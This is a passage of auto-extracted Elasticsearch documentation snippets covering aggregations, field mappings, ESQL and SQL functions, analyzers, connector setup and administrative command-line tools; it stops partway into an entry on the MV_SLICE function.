POST /sales/_search?size=0
{
  "aggs": {
    "sales_over_time": {
      "date_histogram": {
        "field": "date",
        "calendar_interval": "month"
      }
    }
  }
}

----------------------------------------

TITLE: Defining Metadata Operations for Reindex Scripts in Java
DESCRIPTION: Specifies allowed metadata operations for manipulating index, id, routing, version, and operation type in reindex scripts.

LANGUAGE: java
CODE:
class org.elasticsearch.script.Metadata {
    String getIndex()
    void setIndex(String)
    String getId()
    void setId(String)
    String getRouting()
    void setRouting(String)
    long getVersion()
    void setVersion(long)
    boolean org.elasticsearch.script.ReindexMetadata isVersionInternal()
    void org.elasticsearch.script.ReindexMetadata setVersionToInternal()
    String getOp()
    void setOp(String)
}

----------------------------------------

TITLE: Removing Persistent Cluster Settings
DESCRIPTION: Example of using the elasticsearch-node remove-settings command to remove persistent cluster settings that are preventing cluster formation.

LANGUAGE: shell
CODE:
node$ ./bin/elasticsearch-node remove-settings xpack.monitoring.exporters.my_exporter.host

    WARNING: Elasticsearch MUST be stopped before running this tool.

The following settings will be removed:
xpack.monitoring.exporters.my_exporter.host: "10.1.2.3"

You should only run this tool if you have incompatible settings in the
cluster state that prevent the cluster from forming.
This tool can cause data loss and its use should be your last resort.

Do you want to proceed?

Confirm [y/N] y

Settings were successfully removed from the cluster state

----------------------------------------

TITLE: Analyzing Text with Nori Tokenizer and Viewing Token Attributes in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the _analyze API to tokenize Korean text using the nori_tokenizer and view additional token attributes such as POS tags and morphemes.

LANGUAGE: console
CODE:
GET _analyze
{
  "tokenizer": "nori_tokenizer",
  "text": "뿌리가 깊은 나무는",
  "attributes" : ["posType", "leftPOS", "rightPOS", "morphemes", "reading"],
  "explain": true
}

----------------------------------------

TITLE: Indexing a MultiLineString shape in WKT format
DESCRIPTION: Example of indexing a multilinestring shape using the Well-Known Text (WKT) format in Elasticsearch. MultiLineStrings are represented as a list of linestring coordinates.

LANGUAGE: console
CODE:
POST /example/_doc
{
  "location" : "MULTILINESTRING ((1002.0 200.0, 1003.0 200.0, 1003.0 300.0, 1002.0 300.0), (1000.0 100.0, 1001.0 100.0, 1001.0 100.0, 1000.0 100.0), (1000.2 0.2, 1000.8 100.2, 1000.8 100.8, 1000.2 100.8))"
}

----------------------------------------

TITLE: Using LENGTH Function in ESQL Query
DESCRIPTION: Demonstrates how to use the LENGTH function to calculate character lengths of city names in an airports dataset. The query filters for Indian airports, keeps only the city column, and creates a new column with the length of each city name. Note that the function operates on UTF-8 encoded strings.

LANGUAGE: sql
CODE:
FROM airports
| WHERE country == "India"
| KEEP city
| EVAL fn_length = LENGTH(city)

----------------------------------------

TITLE: Token Output from Conditional Filter in Elasticsearch
DESCRIPTION: This snippet shows the resulting tokens after applying the conditional token filter to the input text.

LANGUAGE: text
CODE:
[ the, QUICK, BROWN, fox ]

----------------------------------------

TITLE: Calculating Array Sum with MV_SUM in ESQL
DESCRIPTION: Shows how to use MV_SUM to calculate the sum of integer values in an array field. The example demonstrates summing the array [3, 5, 6] to produce the result 14.

LANGUAGE: esql
CODE:
ROW a=[3, 5, 6]
| EVAL sum_a = MV_SUM(a)

----------------------------------------

TITLE: Date and Time Field Implementations
DESCRIPTION: Defines field types for handling date and time values with both millisecond and nanosecond precision.

LANGUAGE: java
CODE:
class org.elasticsearch.script.field.DateMillisDocValuesField @dynamic_type {
  ZonedDateTime get(ZonedDateTime)
  ZonedDateTime get(int, ZonedDateTime)
}

class org.elasticsearch.script.field.DateNanosDocValuesField @dynamic_type {
  ZonedDateTime get(ZonedDateTime)
  ZonedDateTime get(int, ZonedDateTime)
}

----------------------------------------

TITLE: Concatenating Multivalued String in ESQL using MV_CONCAT
DESCRIPTION: This snippet demonstrates how to use the MV_CONCAT function to convert a multivalued string expression into a single string, separating values with a specified delimiter. It takes an array of strings and a delimiter as arguments.

LANGUAGE: sql
CODE:
ROW a=["foo", "zoo", "bar"]
| EVAL j = MV_CONCAT(a, ", ")

----------------------------------------

TITLE: ESQL Logical Operators Reference
DESCRIPTION: Core logical operators supported in Elasticsearch SQL queries for boolean operations. These operators can be used to combine multiple conditions in WHERE clauses and other boolean expressions.

LANGUAGE: sql
CODE:
AND
OR
NOT

----------------------------------------

TITLE: Cardinality Aggregation with Runtime Field in Elasticsearch
DESCRIPTION: Demonstrates how to use a runtime field to compute the cardinality of a combination of two fields. A new field 'type_and_promoted' is created by concatenating 'type' and 'promoted' fields.

LANGUAGE: console
CODE:
POST /sales/_search?size=0
{
  "runtime_mappings": {
    "type_and_promoted": {
      "type": "keyword",
      "script": "emit(doc['type'].value + ' ' + doc['promoted'].value)"
    }
  },
  "aggs": {
    "type_promoted_count": {
      "cardinality": {
        "field": "type_and_promoted"
      }
    }
  }
}

----------------------------------------

TITLE: Executing a Boosting Query in Elasticsearch
DESCRIPTION: This snippet demonstrates how to perform a boosting query in Elasticsearch. It searches for documents containing 'apple' while reducing the relevance score of documents that also contain words related to apple desserts or trees.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "boosting": {
      "positive": {
        "term": {
          "text": "apple"
        }
      },
      "negative": {
        "term": {
          "text": "pie tart fruit crumble tree"
        }
      },
      "negative_boost": 0.5
    }
  }
}

----------------------------------------

TITLE: Creating and Querying Boolean Fields in Elasticsearch
DESCRIPTION: Example showing how to create an index with a boolean field, index a document with a boolean value, and query for documents with specific boolean values.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "is_published": {
        "type": "boolean"
      }
    }
  }
}

POST my-index-000001/_doc/1?refresh
{
  "is_published": "true"
}

GET my-index-000001/_search
{
  "query": {
    "term": {
      "is_published": true
    }
  }
}

----------------------------------------

TITLE: Basic Weighted Average Aggregation in Elasticsearch
DESCRIPTION: Demonstrates how to calculate a weighted average using grade and weight fields. The aggregation computes weighted averages where each datapoint's contribution is determined by its corresponding weight value.

LANGUAGE: console
CODE:
POST /exams/_search
{
  "size": 0,
  "aggs": {
    "weighted_grade": {
      "weighted_avg": {
        "value": {
          "field": "grade"
        },
        "weight": {
          "field": "weight"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Filtering Sales Data with Bucket Selector
DESCRIPTION: Example showing how to filter monthly sales data buckets where total sales exceed 200. Uses date histogram aggregation combined with bucket selector.

LANGUAGE: console
CODE:
POST /sales/_search
{
  "size": 0,
  "aggs": {
    "sales_per_month": {
      "date_histogram": {
        "field": "date",
        "calendar_interval": "month"
      },
      "aggs": {
        "total_sales": {
          "sum": {
            "field": "price"
          }
        },
        "sales_bucket_filter": {
          "bucket_selector": {
            "buckets_path": {
              "totalSales": "total_sales"
            },
            "script": "params.totalSales > 200"
          }
        }
      }
    }
  }
}

LANGUAGE: json
CODE:
{
   "took": 11,
   "timed_out": false,
   "_shards": ...,
   "hits": ...,
   "aggregations": {
      "sales_per_month": {
         "buckets": [
            {
               "key_as_string": "2015/01/01 00:00:00",
               "key": 1420070400000,
               "doc_count": 3,
               "total_sales": {
                   "value": 550.0
               }
            },
            {
               "key_as_string": "2015/03/01 00:00:00",
               "key": 1425168000000,
               "doc_count": 2,
               "total_sales": {
                   "value": 375.0
               }
            }
         ]
      }
   }
}

----------------------------------------

TITLE: Nested Object Sorting
DESCRIPTION: Shows how to sort results based on fields within nested objects, including filtering and multiple nested levels.

LANGUAGE: console
CODE:
POST /_search
{
   "query" : {
      "term" : { "product" : "chocolate" }
   },
   "sort" : [
       {
          "offer.price" : {
             "mode" :  "avg",
             "order" : "asc",
             "nested": {
                "path": "offer",
                "filter": {
                   "term" : { "offer.color" : "blue" }
                }
             }
          }
       }
    ]
}

----------------------------------------

TITLE: Configuring Basic Numeric Field Mappings in Elasticsearch
DESCRIPTION: Example showing how to configure different numeric field types including integer, float, and scaled_float with a scaling factor of 100.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "number_of_bytes": {
        "type": "integer"
      },
      "time_in_seconds": {
        "type": "float"
      },
      "price": {
        "type": "scaled_float",
        "scaling_factor": 100
      }
    }
  }
}

----------------------------------------

TITLE: Basic Standard Tokenizer Analysis Example
DESCRIPTION: Demonstrates basic usage of the standard tokenizer by analyzing a sample sentence containing mixed case, numbers, and punctuation.

LANGUAGE: console
CODE:
POST _analyze
{
  "tokenizer": "standard",
  "text": "The 2 QUICK Brown-Foxes jumped over the lazy dog's bone."
}

LANGUAGE: text
CODE:
[ The, 2, QUICK, Brown, Foxes, jumped, over, the, lazy, dog's, bone ]

----------------------------------------

TITLE: SQL SHOW COLUMNS Syntax in Elasticsearch
DESCRIPTION: Defines the syntax for the SHOW COLUMNS command, including optional catalog specification, frozen indices inclusion, and table identification options. Supports wildcards and pattern matching for flexible table selection.

LANGUAGE: sql
CODE:
SHOW COLUMNS
    [CATALOG identifier]? <1>
    [INCLUDE FROZEN]?     <2>
    [FROM | IN]
    [table_identifier |   <3>
     LIKE pattern]        <4>

----------------------------------------

TITLE: Querying Date Range Field in Elasticsearch
DESCRIPTION: This snippet demonstrates how to query a date_range field named 'time_frame' using a range query. It includes the 'relation' parameter to specify the relationship between the query range and the indexed range.

LANGUAGE: console
CODE:
GET range_index/_search
{
  "query" : {
    "range" : {
      "time_frame" : {
        "gte" : "2015-10-31",
        "lte" : "2015-11-01",
        "relation" : "within"
      }
    }
  }
}

----------------------------------------

TITLE: Running End-to-End Tests for Azure Blob Storage Connector
DESCRIPTION: Commands to run end-to-end tests for the Azure Blob Storage connector. These tests validate the functionality of the connector against a real data source.

LANGUAGE: sh
CODE:
$ make ftest NAME=azure_blob_storage

LANGUAGE: sh
CODE:
make ftest NAME=azure_blob_storage DATA_SIZE=small

----------------------------------------

TITLE: Describing Absolute Value Function in Elasticsearch
DESCRIPTION: This snippet provides a brief description of the absolute value function in Elasticsearch. It states that the function returns the absolute value of a given input.

LANGUAGE: plaintext
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Description**

Returns the absolute value.

----------------------------------------

TITLE: Defining ShortBuffer Class in Java NIO
DESCRIPTION: Defines the ShortBuffer class with a method to get a short at a specific index. Some methods are commented out as TODOs.

LANGUAGE: Java
CODE:
class java.nio.ShortBuffer {
  short get(int)
  # TODO: https:#github.com/elastic/elasticsearch/issues/79867
  # ShortBuffer get(int, short[])
  # ShortBuffer get(int, short[], int, int)
}

----------------------------------------

TITLE: Advanced Sync Rules for Microsoft SQL Connector
DESCRIPTION: Examples of advanced sync rules for filtering and joining data in Microsoft SQL databases.

LANGUAGE: json
CODE:
[
  {
    "tables": [
      "employee"
    ],
    "query": "SELECT * FROM employee"
  },
  {
    "tables": [
      "customer"
    ],
    "query": "SELECT * FROM customer"
  }
]

LANGUAGE: json
CODE:
[
  {
    "tables": ["employee"],
    "query": "SELECT * FROM employee WHERE emp_id > 5"
  }
]

LANGUAGE: json
CODE:
[
  {
    "tables": ["employee", "customer"],
    "query": "SELECT * FROM employee INNER JOIN customer ON employee.emp_id = customer.c_id"
  }
]

----------------------------------------

TITLE: Querying with Parent Aggregation in Elasticsearch
DESCRIPTION: This snippet shows how to use the parent aggregation to connect answer owners with question tags in a single query.

LANGUAGE: console
CODE:
POST parent_example/_search?size=0
{
  "aggs": {
    "top-names": {
      "terms": {
        "field": "owner.display_name.keyword",
        "size": 10
      },
      "aggs": {
        "to-questions": {
          "parent": {
            "type" : "answer"
          },
          "aggs": {
            "top-tags": {
              "terms": {
                "field": "tags.keyword",
                "size": 10
              }
            }
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Comparing Date Fields with Date Math Expressions
DESCRIPTION: Example of using date math expressions with equality and IN operators to compare date fields.

LANGUAGE: sql
CODE:
SELECT hire_date FROM emp WHERE hire_date = '1987-03-01||+4y/y';

LANGUAGE: sql
CODE:
SELECT hire_date FROM emp WHERE hire_date IN ('1987-03-01||+2y/M', '1987-03-01||+3y/M');

----------------------------------------

TITLE: Implementing REST API Compatibility in Java for Request Parsing
DESCRIPTION: Example of conditional parsing based on the requested API version when processing input from the client.

LANGUAGE: java
CODE:
private static final ParseField limitField = new ParseField("maximum", "limit").forRestApiVersion(RestApiVersion.equalTo(RestApiVersion.V_7));

//call to fromXContent
MyExample.fromXContent(XContentType.JSON.xContent().createParser(XContentParserConfiguration.EMPTY.withDeprecationHandler(LoggingDeprecationHandler.INSTANCE).withRestApiVersion(request.getRestApiVersion()), " { \"limit\" : 99 }"));

//contents of a fromXContent
while ((token = parser.nextToken()) != XContentParser.Token.END_OBJECT) {
    if (token == XContentParser.Token.FIELD_NAME) {
        currentFieldName = parser.currentName();
    } else if (token.isValue()) {
        if (limitField.match(currentFieldName, LoggingDeprecationHandler.INSTANCE)) {
            if (parser.getRestApiVersion().matches(RestApiVersion.onOrAfter(RestApiVersion.V_8))
                && "maximum".equals(currentFieldName) == false) {
                throw new IllegalArgumentException("invalid parameter [limit], use [maximum] instead");
            } else {
                value = parser.intValue();
            }
        }
    }
}

----------------------------------------

TITLE: Querying Airport Data and Calculating Distance in ESQL
DESCRIPTION: This ESQL query filters airports by abbreviation, calculates the distance between the airport location and city location, and selects specific fields for output. It demonstrates the use of WHERE, EVAL, and KEEP clauses in ESQL.

LANGUAGE: esql
CODE:
FROM airports
| WHERE abbrev == "CPH"
| EVAL distance = ST_DISTANCE(location, city_location)
| KEEP abbrev, name, location, city_location, distance

----------------------------------------

TITLE: Converting Strings to Doubles using TO_DOUBLE in Elasticsearch SQL
DESCRIPTION: This snippet demonstrates the use of TO_DOUBLE function to convert various string representations to double values. It shows successful conversions and how null is returned for invalid inputs, along with warning headers.

LANGUAGE: esql
CODE:
ROW str1 = "5.20128E11", str2 = "foo"
| EVAL dbl = TO_DOUBLE("520128000000"), dbl1 = TO_DOUBLE(str1), dbl2 = TO_DOUBLE(str2)

----------------------------------------

TITLE: Using TRIM Function in Elasticsearch SQL
DESCRIPTION: Removes both leading and trailing blanks from the input string.

LANGUAGE: sql
CODE:
SELECT TRIM('   Elastic   ') AS trimmed;

trimmed
--------------
Elastic

----------------------------------------

TITLE: File Path Analysis Implementation
DESCRIPTION: Comprehensive example showing index configuration with both forward and reverse path hierarchy tokenization for file path analysis.

LANGUAGE: console
CODE:
PUT file-path-test
{
  "settings": {
    "analysis": {
      "analyzer": {
        "custom_path_tree": {
          "tokenizer": "custom_hierarchy"
        },
        "custom_path_tree_reversed": {
          "tokenizer": "custom_hierarchy_reversed"
        }
      },
      "tokenizer": {
        "custom_hierarchy": {
          "type": "path_hierarchy",
          "delimiter": "/"
        },
        "custom_hierarchy_reversed": {
          "type": "path_hierarchy",
          "delimiter": "/",
          "reverse": "true"
        }
      }
    }
  },
  "mappings": {
    "properties": {
      "file_path": {
        "type": "text",
        "fields": {
          "tree": {
            "type": "text",
            "analyzer": "custom_path_tree"
          },
          "tree_reversed": {
            "type": "text",
            "analyzer": "custom_path_tree_reversed"
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Adjacency Matrix Aggregation Response in Elasticsearch
DESCRIPTION: This snippet shows the response format of an adjacency matrix aggregation in Elasticsearch. It includes buckets with document counts for each filter and combination of filters, excluding buckets with no matching documents.

LANGUAGE: console
CODE:
{
  "took": 9,
  "timed_out": false,
  "_shards": ...,
  "hits": ...,
  "aggregations": {
    "interactions": {
      "buckets": [
        {
          "key":"grpA",
          "doc_count": 2
        },
        {
          "key":"grpA&grpB",
          "doc_count": 1
        },
        {
          "key":"grpB",
          "doc_count": 2
        },
        {
          "key":"grpB&grpC",
          "doc_count": 1
        },
        {
          "key":"grpC",
          "doc_count": 1
        }
      ]
    }
  }
}

----------------------------------------

TITLE: Duplicating a String with REPEAT Function in ESQL
DESCRIPTION: This snippet shows how to use the REPEAT function in ESQL to create a new column by repeating the value of another column three times. It demonstrates string manipulation within an EVAL clause.

LANGUAGE: esql
CODE:
ROW a = "Hello!"
| EVAL triple_a = REPEAT(a, 3)

----------------------------------------

TITLE: Analyzing Text with HTML Strip Filter in Elasticsearch
DESCRIPTION: Example of using the analyze API with html_strip filter to remove HTML tags from text. The filter converts '<p>I&apos;m so <b>happy</b>!</p>' to newline-delimited plain text.

LANGUAGE: console
CODE:
GET /_analyze
{
  "tokenizer": "keyword",
  "char_filter": [
    "html_strip"
  ],
  "text": "<p>I&apos;m so <b>happy</b>!</p>"
}

----------------------------------------

TITLE: Creating and Querying Token Count Fields in Elasticsearch
DESCRIPTION: This snippet demonstrates how to create an index with a token_count field as a multi-field, index documents, and query based on the token count. It shows the setup for a 'name' text field with a 'length' token_count sub-field.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "name": {
        "type": "text",
        "fields": {
          "length": {
            "type":     "token_count",
            "analyzer": "standard"
          }
        }
      }
    }
  }
}

PUT my-index-000001/_doc/1
{ "name": "John Smith" }

PUT my-index-000001/_doc/2
{ "name": "Rachel Alice Williams" }

GET my-index-000001/_search
{
  "query": {
    "term": {
      "name.length": 3
    }
  }
}

----------------------------------------

TITLE: Creating a Dropbox Connector using Elasticsearch API
DESCRIPTION: Example of using the Elasticsearch API to create a new Dropbox connector. This snippet demonstrates how to set up the basic configuration for the connector.

LANGUAGE: json
CODE:
PUT _connector/my-dropbox-connector
{
  "index_name": "my-elasticsearch-index",
  "name": "Content synced from Dropbox",
  "service_type": "dropbox"
}

----------------------------------------

TITLE: Current Date Retrieval using NOW in ESQL
DESCRIPTION: Demonstrates how to get the current date using the NOW() function. Returns the current timestamp when executed.

LANGUAGE: esql
CODE:
ROW current_date = NOW()

----------------------------------------

TITLE: Querying Current Date and Time with NOW() in Elasticsearch SQL
DESCRIPTION: This SQL query demonstrates the usage of the NOW() function in Elasticsearch SQL. The NOW() function returns the current date and time.

LANGUAGE: sql
CODE:
NOW()

----------------------------------------

TITLE: Basic EQL Query Syntax
DESCRIPTION: Shows the basic structure of an EQL query with event category and condition.

LANGUAGE: eql
CODE:
event_category where condition

----------------------------------------

TITLE: Creating an Index with a search_as_you_type Field in Elasticsearch
DESCRIPTION: This snippet demonstrates how to create an Elasticsearch index with a field of type search_as_you_type. It shows the basic mapping structure for this field type.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "my_field": {
        "type": "search_as_you_type"
      }
    }
  }
}

----------------------------------------

TITLE: Response Showing Sequence Number Assignment
DESCRIPTION: Example response showing the assigned sequence number (_seq_no) and primary term (_primary_term) for the created document.

LANGUAGE: console
CODE:
{
  "_shards": {
    "total": 2,
    "failed": 0,
    "successful": 1
  },
  "_index": "products",
  "_id": "1567",
  "_version": 1,
  "_seq_no": 362,
  "_primary_term": 2,
  "result": "created"
}

----------------------------------------

TITLE: Using RIGHT Function in Elasticsearch SQL
DESCRIPTION: Returns the rightmost specified number of characters from the input string.

LANGUAGE: sql
CODE:
SELECT RIGHT('Elastic',3);

RIGHT('Elastic',3)
------------------
tic

----------------------------------------

TITLE: SQL CASE Expression
DESCRIPTION: The CASE expression provides if-else conditional logic in SQL queries. It evaluates multiple WHEN conditions and returns the corresponding THEN result for the first true condition, with an optional ELSE clause for default results.

LANGUAGE: sql
CODE:
CASE WHEN condition THEN result
    [WHEN ...]
    [ELSE default_result]
END

----------------------------------------

TITLE: Using Arithmetic Operators with Time Spans in ESQL
DESCRIPTION: This snippet illustrates how to use the subtraction operator with a time span to filter data within the last hour.

LANGUAGE: esql
CODE:
FROM sample_data
| WHERE @timestamp > NOW() - 1 hour

----------------------------------------

TITLE: Running Docker Extraction Service
DESCRIPTION: Docker command to run the self-hosted content extraction service on port 8090.

LANGUAGE: bash
CODE:
$ docker run \
  -p 8090:8090 \
  -it \
  --name extraction-service \
  docker.elastic.co/integrations/data-extraction-service:$EXTRACTION_SERVICE_VERSION

----------------------------------------

TITLE: Anonymous Filters Aggregation in Elasticsearch
DESCRIPTION: Shows how to use anonymous filters in an array format instead of named filters, where buckets are returned in the same order as provided in the request.

LANGUAGE: console
CODE:
GET logs/_search
{
  "size": 0,
  "aggs" : {
    "messages" : {
      "filters" : {
        "filters" : [
          { "match" : { "body" : "error"   }},
          { "match" : { "body" : "warning" }}
        ]
      }
    }
  }
}

----------------------------------------

TITLE: Adding Files to Keystore
DESCRIPTION: Examples of adding files to the keystore using the add-file command for single and multiple files.

LANGUAGE: shell
CODE:
bin/elasticsearch-keystore add-file the.setting.name.to.set /path/example-file.json

LANGUAGE: shell
CODE:
bin/elasticsearch-keystore add-file \
  the.setting.name.to.set /path/example-file.json \
  the.other.setting.name.to.set /path/other-example-file.json

----------------------------------------

TITLE: Querying Geo Points with Geo-distance in Elasticsearch
DESCRIPTION: Demonstrates how to use a geo_distance filter to match geo_point values within a specified distance of another geopoint.

LANGUAGE: console
CODE:
GET /my_locations/_search
{
  "query": {
    "bool": {
      "must": {
        "match_all": {}
      },
      "filter": {
        "geo_distance": {
          "distance": "200km",
          "pin.location": {
            "lat": 40,
            "lon": -70
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Creating an Index with copy_to Mapping in Elasticsearch
DESCRIPTION: This snippet demonstrates how to create an index with mappings that use the copy_to parameter to copy values from first_name and last_name fields into a full_name field.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "first_name": {
        "type": "text",
        "copy_to": "full_name"
      },
      "last_name": {
        "type": "text",
        "copy_to": "full_name"
      },
      "full_name": {
        "type": "text"
      }
    }
  }
}

----------------------------------------

TITLE: Customizing N-gram Token Filter in Elasticsearch
DESCRIPTION: This example demonstrates how to create a custom N-gram token filter that forms n-grams between 3-5 characters and increases the index.max_ngram_diff setting to 2.

LANGUAGE: console
CODE:
PUT ngram_custom_example
{
  "settings": {
    "index": {
      "max_ngram_diff": 2
    },
    "analysis": {
      "analyzer": {
        "default": {
          "tokenizer": "whitespace",
          "filter": [ "3_5_grams" ]
        }
      },
      "filter": {
        "3_5_grams": {
          "type": "ngram",
          "min_gram": 3,
          "max_gram": 5
        }
      }
    }
  }
}

----------------------------------------

TITLE: Calculating Sum Using ESQL SUM Function
DESCRIPTION: This snippet demonstrates how to use the SUM function in ESQL to calculate the sum of a numeric field 'languages' from the 'employees' table. The query uses the FROM clause to specify the source table and the STATS clause to apply the SUM aggregation.

LANGUAGE: sql
CODE:
FROM employees
| STATS SUM(languages)

----------------------------------------

TITLE: Basic Value Count Aggregation in Elasticsearch
DESCRIPTION: Demonstrates a simple value count aggregation that counts values in the 'type' field. The aggregation returns the total number of values without de-duplication.

LANGUAGE: console
CODE:
POST /sales/_search?size=0
{
  "aggs" : {
    "types_count" : { "value_count" : { "field" : "type" } }
  }
}

----------------------------------------

TITLE: Analyzing text with keep words filter in Elasticsearch
DESCRIPTION: This example demonstrates how to use the keep words filter in an analyze API request. It keeps only the 'fox' and 'dog' tokens from the input text.

LANGUAGE: console
CODE:
GET _analyze
{
  "tokenizer": "whitespace",
  "filter": [
    {
      "type": "keep",
      "keep_words": [ "dog", "elephant", "fox" ]
    }
  ],
  "text": "the quick fox jumps over the lazy dog"
}

----------------------------------------

TITLE: Date Math Index Name Pattern
DESCRIPTION: Shows the format for using date math expressions in index and alias names.

LANGUAGE: txt
CODE:
<static_name{date_math_expr{date_format|time_zone}}>

----------------------------------------

TITLE: Using Pre-Indexed Shapes for Querying in Elasticsearch
DESCRIPTION: This snippet demonstrates how to create an index for storing shapes, index a shape, and then use that pre-indexed shape in a query.

LANGUAGE: console
CODE:
PUT /shapes
{
  "mappings": {
    "properties": {
      "geometry": {
        "type": "shape"
      }
    }
  }
}

PUT /shapes/_doc/footprint
{
  "geometry": {
    "type": "envelope",
    "coordinates": [ [ 1355.0, 5355.0 ], [ 1400.0, 5200.0 ] ]
  }
}

GET /example/_search
{
  "query": {
    "shape": {
      "geometry": {
        "indexed_shape": {
          "index": "shapes",
          "id": "footprint",
          "path": "geometry"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Configuring Pattern Replace Filter for CamelCase
DESCRIPTION: Example demonstrating how to configure a pattern_replace character filter to split camelCase words by inserting spaces between lowercase and uppercase letters.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "standard",
          "char_filter": [
            "my_char_filter"
          ],
          "filter": [
            "lowercase"
          ]
        }
      },
      "char_filter": {
        "my_char_filter": {
          "type": "pattern_replace",
          "pattern": "(?<=\\p{Lower})(?=\\p{Upper})",
          "replacement": " "
        }
      }
    }
  },
  "mappings": {
    "properties": {
      "text": {
        "type": "text",
        "analyzer": "my_analyzer"
      }
    }
  }
}

POST my-index-000001/_analyze
{
  "analyzer": "my_analyzer",
  "text": "The fooBarBaz method"
}

----------------------------------------

TITLE: Markdown Documentation - GREATER_THAN_OR_EQUAL Function
DESCRIPTION: Markdown formatted documentation explaining the GREATER_THAN_OR_EQUAL function, its behavior with multivalued fields, and optimization conditions for search index queries.

LANGUAGE: markdown
CODE:
### GREATER_THAN_OR_EQUAL
Check if one field is greater than or equal to another. If either field is <<esql-multivalued-fields,multivalued>> then the result is `null`.

Note: This is pushed to the underlying search index if one side of the comparison is constant and the other side is a field in the index that has both an <<mapping-index>> and <<doc-values>>.

----------------------------------------

TITLE: Using DATE_FORMAT Function
DESCRIPTION: Examples of using DATE_FORMAT function to format dates and times as strings using MySQL-style format specifiers.

LANGUAGE: sql
CODE:
SELECT DATE_FORMAT(CAST('2020-04-05' AS DATE), '%d/%m/%Y') AS "date";

LANGUAGE: sql
CODE:
SELECT DATE_FORMAT(CAST('2020-04-05T11:22:33.987654' AS DATETIME), '%d/%m/%Y %H:%i:%s.%f') AS "datetime";

LANGUAGE: sql
CODE:
SELECT DATE_FORMAT(CAST('23:22:33.987' AS TIME), '%H %i %s.%f') AS "time";

----------------------------------------

TITLE: Documenting ESQL Function Parameters in Markdown
DESCRIPTION: This snippet defines the parameters for an ESQL function. It describes 'first' as the initial column to evaluate and 'rest' as the remaining columns.

LANGUAGE: markdown
CODE:
**Parameters**

`first`
:   First of the columns to evaluate.

`rest`
:   The rest of the columns to evaluate.

----------------------------------------

TITLE: Boxplot with Compression Parameter
DESCRIPTION: Example showing how to configure the compression parameter to control memory usage and approximation accuracy in boxplot calculations.

LANGUAGE: console
CODE:
GET latency/_search
{
  "size": 0,
  "aggs": {
    "load_time_boxplot": {
      "boxplot": {
        "field": "load_time",
        "compression": 200
      }
    }
  }
}

----------------------------------------

TITLE: Calculating Centroid using ST_CENTROID_AGG in Elasticsearch SQL
DESCRIPTION: This ESQL query calculates the centroid of location data from an 'airports' dataset using the ST_CENTROID_AGG function. The result is a single geo_point representing the central point of all locations.

LANGUAGE: esql
CODE:
FROM airports
| STATS centroid=ST_CENTROID_AGG(location)

----------------------------------------

TITLE: Query_string search with minimum_should_match in Elasticsearch
DESCRIPTION: Performs a query_string search for 'this that thus' in the 'title' field, requiring at least 2 terms to match.

LANGUAGE: json
CODE:
GET /_search
{
  "query": {
    "query_string": {
      "fields": [
        "title"
      ],
      "query": "this that thus",
      "minimum_should_match": 2
    }
  }
}

----------------------------------------

TITLE: Put Role Event Example
DESCRIPTION: Example of a put_role audit event when creating or updating a role via the security config change API.

LANGUAGE: javascript
CODE:
{"type":"audit", "timestamp":"2020-12-30T22:27:01,978+0200", "node.id":"0RMNyghkQYCc_gVd1G6tZQ", "event.type":"security_config_change", "event.action":"put_role", "request.id":"tDYQhv5CRMWM4Sc5Zkk2cQ", "put":{"role":{"name":"test_role","role_descriptor":{"cluster":["all"], "indices":[{"names":["apm*"],"privileges":["all"],"field_security":{"grant":["granted"]},"query":"{\"term\": {\"service.name\": \"bar\"}}"}]}}}}

----------------------------------------

TITLE: Indexing Hierarchical JSON Document in Elasticsearch
DESCRIPTION: Demonstrates how to index a hierarchical JSON document containing nested objects in Elasticsearch using the PUT method.

LANGUAGE: console
CODE:
PUT my-index-000001/_doc/1
{ <1>
  "region": "US",
  "manager": { <2>
    "age":     30,
    "name": { <3>
      "first": "John",
      "last":  "Smith"
    }
  }
}

----------------------------------------

TITLE: Basic Rare Terms Aggregation in Elasticsearch
DESCRIPTION: Demonstrates the basic syntax for a rare terms aggregation, specifying the field to analyze and the maximum document count for a term to be considered rare.

LANGUAGE: js
CODE:
{
  "rare_terms": {
    "field": "the_field",
    "max_doc_count": 1
  }
}

----------------------------------------

TITLE: RRF Retriever Hybrid Search Example in Elasticsearch
DESCRIPTION: Demonstrates a hybrid search combining lexical and vector search using an RRF retriever.

LANGUAGE: console
CODE:
GET /restaurants/_search
{
  "retriever": {
    "rrf": {
      "retrievers": [
        {
          "standard": {
            "query": {
              "multi_match": {
                "query": "Austria",
                "fields": [
                  "city",
                  "region"
                ]
              }
            }
          }
        },
        {
          "knn": {
            "field": "vector",
            "query_vector": [10, 22, 77],
            "k": 10,
            "num_candidates": 10
          }
        }
      ],
      "rank_constant": 1,
      "rank_window_size": 50
    }
  }
}

----------------------------------------

TITLE: Customizing Simple Analyzer in Elasticsearch
DESCRIPTION: Example showing how to create a custom analyzer based on the simple analyzer with the ability to add token filters.

LANGUAGE: console
CODE:
PUT /my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_custom_simple_analyzer": {
          "tokenizer": "lowercase",
          "filter": [                          <1>
          ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: ServiceNow Connector Docker Configuration
DESCRIPTION: Sample YAML configuration for deploying the connector using Docker

LANGUAGE: yaml
CODE:
elasticsearch.host: http://host.docker.internal:9200
elasticsearch.api_key: <ELASTICSEARCH_API_KEY>

connectors:
  -
    connector_id: <CONNECTOR_ID_FROM_KIBANA>
    service_type: servicenow
    api_key: <CONNECTOR_API_KEY_FROM_KIBANA>

----------------------------------------

TITLE: Using MV_SLICE Function in Elasticsearch SQL
